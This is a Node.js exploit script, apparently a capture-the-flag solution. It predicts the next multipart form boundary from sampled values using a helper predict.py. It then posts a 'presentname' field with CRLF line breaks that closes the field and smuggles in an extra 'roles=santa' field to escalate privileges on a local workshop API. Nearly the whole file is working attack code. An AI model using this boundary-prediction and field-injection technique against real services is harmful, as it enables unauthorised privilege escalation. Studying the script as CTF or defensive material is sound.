import { execSync } from "child_process";

const TARGET = "http://localhost:8000/api/workshop/present";
const PREDICT = "./predict.py";
const COOKIE = process.env.COOKIE;

const samples = [
    "1989826433",
    "72871805315",
    "78030305743",
    "48292911375",
    "30244552393",
    "55930360866",
    "30151278498",
    "2047738770",
    "1075569298",
    "62956090589",
];

function predict(values) {
    const out = execSync(
        `python3 "${PREDICT}" '${JSON.stringify(values)}'`
    ).toString().trim();

    if (!out)
        throw new Error("predict.py returned nothing");

    return out;
}

function makeBoundary(suffix) {
    return `----formdata-undici-${String(suffix).padStart(12, "0")}`;
}

async function main() {
    const next = predict(samples);
    const boundary = makeBoundary(next);

    console.log("predicted:", boundary);

    // break out of presentname and add another multipart field
    const presentname =
        `flag\r\n` +
        `--${boundary}\r\n` +
        `Content-Disposition: form-data; name="roles"\r\n\r\n` +
        `santa\r\n`;

    const headers = {
        "Content-Type": "application/x-www-form-urlencoded",
    };

    if (COOKIE)
        headers.Cookie = COOKIE;

    const res = await fetch(TARGET, {
        method: "POST",
        headers,
        body: `presentname=${encodeURIComponent(presentname)}`,
    });

    console.log(res.status);
    console.log(await res.text());
}

main();